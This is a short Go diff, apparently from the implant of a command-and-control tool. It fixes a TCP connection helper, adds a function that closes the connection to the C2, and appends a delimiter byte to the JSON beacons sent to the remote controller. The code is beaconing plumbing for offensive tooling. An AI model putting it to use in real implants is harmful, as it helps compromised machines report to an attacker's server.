@@ -1,4 +1,4 @@
-package reiner
+package main
 
 import (
 	"encoding/json"
@@ -8,8 +8,14 @@ import (
 )
 
 // CreateTCPConnection connects to a remote C@ via TCP
-func CreateTCPConnection(remoteHost string, remotePort string) (connection *net.Conn, err error) {
-	*connection, err = net.Dial("tcp", remoteHost+":"+remotePort)
+func CreateTCPConnection(remoteHost string, remotePort string) (connection net.Conn, err error) {
+	connection, err = net.Dial("tcp", remoteHost+":"+remotePort)
+	return
+}
+
+// CloseConnection closes an existing net.Conn to the C2
+func CloseConnection(connection net.Conn) (err error) {
+	err = connection.Close()
 	return
 }
 
@@ -25,7 +31,7 @@ func SendBeacon(beacon models.Beacon, connection net.Conn) (err error) {
 	if jsonErr != nil {
 		return jsonErr
 	}
-	_, err = connection.Write(dataBytes)
+	_, err = connection.Write(append(dataBytes, []byte{0xff}...))
 	return
 }
 
